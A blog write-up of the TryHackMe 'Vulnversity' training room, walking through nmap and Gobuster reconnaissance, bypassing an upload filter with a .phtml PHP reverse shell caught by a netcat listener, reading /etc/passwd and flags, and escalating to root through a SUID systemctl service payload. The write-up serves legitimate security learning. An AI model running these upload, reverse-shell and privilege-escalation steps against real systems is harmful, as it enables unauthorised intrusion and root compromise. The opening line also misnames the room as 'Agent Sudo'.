---
layout: post
title:  "THM writeup - Vulnversity"
date:   2021-07-16 17:55:43 +0100
categories: post update
---

Writeup on the TryHackMe room "Agent Sudo".

[Link to room.](https://tryhackme.com/room/vulnversity)

Vulnversity is a **free** easy training CTF box from TryHackMe which provides a guided introduction to reconnaissance, reverse web-shell upload and privilege escalation.

Our first task (after deploying the machine) is to use the port scanning utility [nmap](https://nmap.org/) to check for open ports.
*Note: The IP may change on different deployments*

We are instructed to use the ```-sV``` parameter, which will attempt to determine the version of the services running.

```
downeg:vulnversity$ sudo nmap -sV 10.10.95.113
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 13:38 IST
Nmap scan report for 10.10.95.113
Host is up (0.037s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.18 seconds

downeg:vulnversity$ 
```

From this scan nmap has discovered 6 open ports, and provides the versions of the applications running on each discovered port.
nmap will also guess at the host OS depending on the software versions discovered.

The next task is to enumerate the directories on the web server running on port 3333 to see if there are any hidden directories.
The tool to be used is [Gobuster](https://github.com/OJ/gobuster)

```
downeg:vulnversity$ gobuster dir -u http://10.10.95.113:3333 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.95.113:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/16 13:42:17 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 298]
/.hta                 (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 317] [--> http://10.10.95.113:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.95.113:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.95.113:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                     
/internal             (Status: 301) [Size: 322] [--> http://10.10.95.113:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.95.113:3333/js/]      
/server-status        (Status: 403) [Size: 302]                                         
                                                                                        
===============================================================
2021/07/16 13:42:36 Finished
===============================================================

downeg:vulnversity$
```

The task explicitly mentions finding only hidden directories, however if we wanted to expand on this search and enumerate files we can add the -x parameter and include the file extensions we are interested in locating. Note that this is not recursive and will only search in the URL path provided.

```
downeg:vulnversity$ gobuster dir -u http://10.10.95.113:3333 -w /usr/share/wordlists/dirb/common.txt -x txt,php,htm,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.95.113:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,htm,html
[+] Timeout:                 10s
===============================================================
2021/07/16 13:52:11 Starting gobuster in directory enumeration mode
===============================================================
/.hta.htm             (Status: 403) [Size: 297]
/.hta.html            (Status: 403) [Size: 298]
/.hta                 (Status: 403) [Size: 293]
/.hta.txt             (Status: 403) [Size: 297]
/.hta.php             (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 298]
/.htpasswd.php        (Status: 403) [Size: 302]
/.htaccess.html       (Status: 403) [Size: 303]
/.htpasswd.htm        (Status: 403) [Size: 302]
/.htaccess.txt        (Status: 403) [Size: 302]
/.htaccess.php        (Status: 403) [Size: 302]
/.htpasswd            (Status: 403) [Size: 298]
/.htaccess.htm        (Status: 403) [Size: 302]
/.htpasswd.html       (Status: 403) [Size: 303]
/.htpasswd.txt        (Status: 403) [Size: 302]
/css                  (Status: 301) [Size: 317] [--> http://10.10.95.113:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.95.113:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.95.113:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                     
/index.html           (Status: 200) [Size: 33014]                                     
/internal             (Status: 301) [Size: 322] [--> http://10.10.95.113:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.95.113:3333/js/]      
/server-status        (Status: 403) [Size: 302]                                         
                                                                                        
===============================================================
2021/07/16 13:53:47 Finished
===============================================================

downeg:vulnversity$
```

The ```/usr/share/wordlists/dirb/common.txt``` wordlist (included in Kali Linux be default) is not too extensive with only 4614 entries, however it is a good starting point to make sure that Gobuster is returning valid results. 

There are other wordlists available with a larger scope. A popular one which is included in Kali Linux is ```/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt``` with 220560 entries.

The ```http://10.10.95.113:3333/internal/``` directory looks interesting, so we can enumerate further with Gobuster.

```
downeg:vulnversity$ gobuster dir -u http://10.10.95.113:3333/internal/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.95.113:3333/internal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/16 14:17:03 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/css                  (Status: 301) [Size: 326] [--> http://10.10.95.113:3333/internal/css/]
/index.php            (Status: 200) [Size: 525]                                             
/uploads              (Status: 301) [Size: 330] [--> http://10.10.95.113:3333/internal/uploads/]
                                                                                                
===============================================================
2021/07/16 14:17:21 Finished
===============================================================

downeg:vulnversity$
```

This provides some valuable information. We know that the server is processing PHP, and that there is an ```/uploads/``` directory, so we can try to upload a PHP reverse web-shell to gain a foothold.

At the page ```http://10.10.95.113:3333/internal/index.php``` we can upload files, however files with the ```.php``` file extension are not allowed.

![]({{site.baseurl}}/assets/vulnversity_ext_not_allowed.png)

We are tasked with fuzzing the upload form using [BurpSuite](https://portswigger.net/burp)'s Intruder to find out what file extensions are accepted.

Using the hinted extension list ```php, php3, php4, php5, phtml``` we set our payload position and start the attack.

![]({{site.baseurl}}/assets/vulnversity_burp_payload.png)

From this attack is seems that we can upload ```.phtml``` files as the response length is different.

![]({{site.baseurl}}/assets/vulnversity_intruder_result.png)

A quick test from the web page shows this to be true.

![]({{site.baseurl}}/assets/vulnversity_upload_successful.png)

![]({{site.baseurl}}/assets/vulnversity_uploads_file_listing.png)

The recommended reverse shell for this box is the [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) on GitHub.

The script will need to be modified to connect to the IP our local machine with the port netcat will be listening on. Once the extension is changed to ```.phtml``` the script can be uploaded. 



With netcat listening on our local host on the configured port we can execute the reverse shell payload by pointing our browser to the uploaded file. It will be uploaded to the ```/internal/uploads/``` directory.

We now have a reverse shell running on the server as the www-data user.

```
downeg:vulnversity$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.14.12.41] from (UNKNOWN) [10.10.95.113] 43806
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 10:00:10 up  1:24,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

The www-user on this system has enough privileges to show us the username for another account, and also to get the flag from that user's home directory

```
$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
bill:x:1000:1000:,,,:/home/bill:/bin/bash
$

$ ls /home/bill
user.txt
$ cat /home/bill/user.txt
8bd7992fbe8a6ad22a63361004cfcedb
$
```

Time for some privilege escalation to get root. Our hint is to search for files/programs which have the SUID set using the command: ```find / -user root -perm -4000 -exec ls -ldb {} \;```

The returned information shows that one of the utilities which has the SUID set is ```/bin/systemctl```, and this can be [exploited](https://gtfobins.github.io/gtfobins/systemctl/).

We can craft a payload to redirect the output of commands to a text file which we can later read. If the service is exploited successfully the command will be run with root privileges.

```
PAYLOAD=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $PAYLOAD
```

With the payload above typed carefully into our netcat reverse shell session it's time to try it.

```
$ /bin/systemctl link $PAYLOAD
Created symlink from /etc/systemd/system/tmp.JoBJldD8zM.service to /tmp/tmp.JoBJldD8zM.service.
$ /bin/systemctl enable --now $PAYLOAD
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.JoBJldD8zM.service to /tmp/tmp.JoBJldD8zM.service.
$ cat /tmp/output
uid=0(root) gid=0(root) groups=0(root)
$
```

We now have a working POC showing that the id command was run as root.
To capture the flag we can simply modify the ExecStart line of the payload to be ExecStart=/bin/sh -c "ls /root > /tmp/output" and this will provide us with the contents of the root user home directory.

```
$ /bin/systemctl link $PAYLOAD                          
Created symlink from /etc/systemd/system/tmp.5dMqFmEncd.service to /tmp/tmp.5dMqFmEncd.service.
$ /bin/systemctl enable --now $PAYLOAD
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.5dMqFmEncd.service to /tmp/tmp.5dMqFmEncd.service.
$ cat /tmp/output
root.txt
$
```

One final modification to the ExecStart line to cat the contents of that file to our output file and we have the root flag.

![]({{site.baseurl}}/assets/vulnversity_root_flag.png)